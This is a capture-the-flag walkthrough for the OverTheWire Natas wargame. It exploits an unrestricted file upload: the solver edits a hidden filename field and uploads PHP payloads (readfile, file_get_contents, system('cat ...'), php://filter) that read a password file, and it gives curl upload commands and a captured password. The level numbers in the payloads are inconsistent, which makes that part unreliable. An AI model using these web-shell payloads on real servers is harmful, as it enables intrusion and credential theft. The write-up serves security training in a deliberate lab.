# 🔐 Natas Level: Natas11--->Natas12



### 📂 Execution Process 

👉

- Create a .php file
- enter this payload and save the file
```
<?php readfile('/etc/natas_webpass/natas13'); ?>
```
- inspect to element tab
- inside the value change it to t.php
<img width="1469" height="872" alt="Screenshot 2025-10-01 at 12 30 03 PM" src="https://github.com/user-attachments/assets/2c54174a-856a-4c01-965e-6042515601c1" />
- then upload t.php
<img width="1467" height="875" alt="Screenshot 2025-10-01 at 12 30 44 PM" src="https://github.com/user-attachments/assets/9080169f-81b0-41fa-9f08-c3c7576a5fbe" />
- click on random url and get the password
<img width="1469" height="872" alt="Screenshot 2025-10-01 at 12 31 11 PM" src="https://github.com/user-attachments/assets/84f3c900-7e2c-401b-84ca-278bb34034de" />

### 📄 Password found:
👉 
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

### NOTES


**Short summary:** Change the hidden `filename` value to `.php`, upload a tiny PHP file that reads `/etc/natas_webpass/natas12`, then open the uploaded URL.

---

## Payload files (put exactly these into files)

**payload.php**

```
<?php echo file_get_contents('/etc/natas_webpass/natas12'); ?>
```

**Alt 1 — system (if file_get_contents blocked)**

```
<?php system('cat /etc/natas_webpass/natas12'); ?>
```

**Alt 2 — readfile (another PHP read)**

```
<?php readfile('/etc/natas_webpass/natas12'); ?>
```

**Alt 3 — php://filter base64 (if direct read garbled)**

```
<?php echo file_get_contents('php://filter/read=convert.base64-encode/resource=/etc/natas_webpass/natas12'); ?>
```

---

## Check file size (must be < 1000 bytes)

```
wc -c payload.php
```

---

## Browser (DevTools) steps

1. Open the upload page.
2. Right-click → Inspect → Elements.
3. Find the hidden input line like:

```
<input type="hidden" name="filename" value="something.jpg" />
```

4. Double-click the `value` and replace with:

```
exploit.php
```

5. Choose `payload.php` in the file chooser and submit the form.
6. Click/open the returned `upload/<random>.php` URL to see the password.

---

## Curl (copy-paste ready)

**Upload** (replace URL with your level URL):

```
curl -i -s -k -X POST -F "filename=exploit.php" -F "uploadedfile=@payload.php" "http://natas11.natas.labs.overthewire.org/index.php"
```

**Fetch uploaded file** (use the link returned by the upload step):

```
curl "http://natas11.natas.labs.overthewire.org/upload/abcd1234.php"
```

---

## Troubleshooting quick table

```
| Payload                     | Use when                                      |
|----------------------------|-----------------------------------------------|
| file_get_contents(...)     | Default, reads file if allowed                |
| system('cat ...')          | If file_get_contents blocked but system allowed |
| readfile(...)              | Alternative PHP read function                 |
| php://filter base64        | Returns base64 output—decode locally         |
```

**Decode base64 locally** (if using php://filter):

```
echo "BASE64TEXT" | base64 -d
```

---

## Example full run (exact)

1. Create `payload.php` with the first payload.
2. Ensure `wc -c payload.php` shows less than `1000`.
3. Change hidden filename to `exploit.php` in DevTools and upload.
4. Open the returned `upload/<random>.php` URL — password should appear.

---

If you want this as a GitHub README file or another filename, tell me the filename and I'll adjust.
